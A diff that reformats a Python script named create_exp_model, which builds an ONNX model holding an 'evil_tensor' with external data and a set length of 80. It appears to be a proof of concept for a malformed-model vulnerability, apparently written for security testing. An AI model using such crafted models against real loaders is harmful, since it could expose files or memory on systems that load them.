@@ -1,6 +1,6 @@
-import numpy as np
 import onnx
-from onnx import helper, TensorProto
+from onnx import TensorProto, helper
+
 
 def create_exp_model():
     inputs = []
@@ -16,7 +16,7 @@ def create_exp_model():
         data_type=TensorProto.INT64,
         # dims=[100, 100],
         dims=[10],
-        vals=[]
+        vals=[],
     )
     tensors.append(evil_tensor)
     evil_tensor.data_location = TensorProto.EXTERNAL
@@ -31,27 +31,12 @@ def create_exp_model():
     entry3.key = "length"
     entry3.value = "80"
 
-    tensors.append(helper.make_tensor(
-        name="0x1",
-        data_type=TensorProto.INT64,
-        dims=[1],
-        vals=[0x1]
-    ))
-    nodes.append(helper.make_node(
-        op_type="Add",
-        inputs=["evil_weights", "0x1"],
-        outputs=["output"]
-    ))
+    tensors.append(helper.make_tensor(name="0x1", data_type=TensorProto.INT64, dims=[1], vals=[0x1]))
+    nodes.append(helper.make_node(op_type="Add", inputs=["evil_weights", "0x1"], outputs=["output"]))
 
     outputs.append(helper.make_tensor_value_info("output", TensorProto.INT64, []))
 
-    graph = helper.make_graph(
-        nodes,
-        "test",
-        inputs,
-        outputs,
-        tensors
-    )
+    graph = helper.make_graph(nodes, "test", inputs, outputs, tensors)
     model = helper.make_model(
         graph,
         opset_imports=[helper.make_opsetid("", 18), helper.make_opsetid("ai.onnx.ml", 3)],
